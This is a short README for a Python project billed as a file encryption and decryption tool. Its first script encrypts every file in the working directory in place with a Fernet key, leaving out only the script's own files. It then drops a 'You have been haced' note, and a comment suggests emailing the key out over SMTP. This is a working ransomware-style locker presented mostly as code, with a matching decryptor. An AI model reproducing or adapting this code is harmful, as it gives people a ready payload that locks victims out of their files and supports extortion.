# Python-encrypt-and-decrypt-file
In this project you can encrypt and decrypt files with generate a key.<br>
<b> <ins>Not: </ins> </b> The code just work for same directory files . İf out of the directory it doesnt work. 


<h2>1.Encrypt file </h2>

```python 
import os
from cryptography.fernet import Fernet


Files=[]

for file in os.listdir(): 
    if file=="voldemor.py" or  file =="thekey.key" or file=="decryption.py" or file=="hacked.txt":
        continue
    Files.append(file)


key=Fernet.generate_key() # Generate key
with open("thekey.key","wb") as f:
    f.write(key) # save key in thekey.key file or you cane use smtp and send the to your mail.

for file in Files :
    with open(file,"rb") as thefile:
        contects=thefile.read()
    contect_encrypted=Fernet(key).encrypt(contects) # Encrypt to contect 
    with open(file,"wb") as keyfile:
        keyfile.write(contect_encrypted) # save encrypt contect
with open("hacked.txt","w" ) as m: # make fun with hacked text . 
    m.write("You have been haced!!!!")
    
```


<h2> 2. Decrypt file </h2> 

``` python 
import os
from cryptography.fernet import Fernet


Files=[]

for file in os.listdir():
    if file=="voldemor.py" or  file =="thekey.key" or file=="decryption.py" or file=="hacked.txt" : # pass the key and decryption file 
        continue
    Files.append(file)




with open("thekey.key","rb") as f:
    scretkey=f.read()    # take the encrypt key

for file in Files :
    with open(file,"rb") as thefile:
        contects=thefile.read()  # save contect in the file
    contect_decrypted=Fernet(scretkey).decrypt(contects) # use the encrpyt key and decrypt contect
    with open(file,"wb") as keyfile:
        keyfile.write(contect_decrypted)
    
```
